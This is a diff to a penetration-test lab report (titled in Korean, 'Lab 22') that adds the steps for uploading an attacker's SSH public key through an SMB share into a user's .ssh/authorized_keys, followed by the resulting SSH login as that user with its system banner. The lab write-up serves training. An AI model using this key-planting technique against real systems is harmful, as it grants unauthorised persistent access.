@@ -2,7 +2,7 @@
 publish: true
 title: 모의해킹 보고서 – Lab 22
 created: 2026-11-20T00:02:44.797Z
-modified: 2026-11-20T05:03:40.694Z
+modified: 2026-11-20T05:10:03.509Z
 tags:
   - pentest
   - linux
@@ -493,10 +493,60 @@ smb: \> ls
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFhiWa1Oj5LSEnfgjsamKS9GgobWuoQLJAkmZBdJTkux kali@133
 ```
 
-```
-```
+![[Template/Image/Pasted image 20261120140752.png]]
 
 ```
+smb: \marcus\.ssh\> put authorized_keys
+putting file authorized_keys as \marcus\.ssh\authorized_keys (0.3 kB/s) (average 0.3 kB/s)
+smb: \marcus\.ssh\> ls
+  .                                   D        0  Fri Nov 20 14:05:36 2026
+  ..                                  D        0  Fri Nov 20 13:46:36 2026
+  authorized_keys                     A       90  Fri Nov 20 14:05:36 2026
+
+		5768764 blocks of size 1024. 2290416 blocks available
+```
+
+![[Template/Image/Pasted image 20261120140953.png]]
+
+```
+└─$ ssh marcus@lab22 -i ~/.ssh/id_ed25519
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri Nov 20 05:07:04 AM UTC 2026
+
+  System load:           0.0
+  Usage of /:            59.1% of 5.50GB
+  Memory usage:          12%
+  Swap usage:            0%
+  Processes:             220
+  Users logged in:       1
+  IPv4 address for eth0: 10.129.244.177
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:4295
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+1 update can be applied immediately.
+1 of these updates is a standard security update.
+To see these additional updates run: apt list --upgradable
+
+1 additional security update can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Fri Nov 20 05:07:04 2026 from 10.10.14.220
 ```
 
 ```
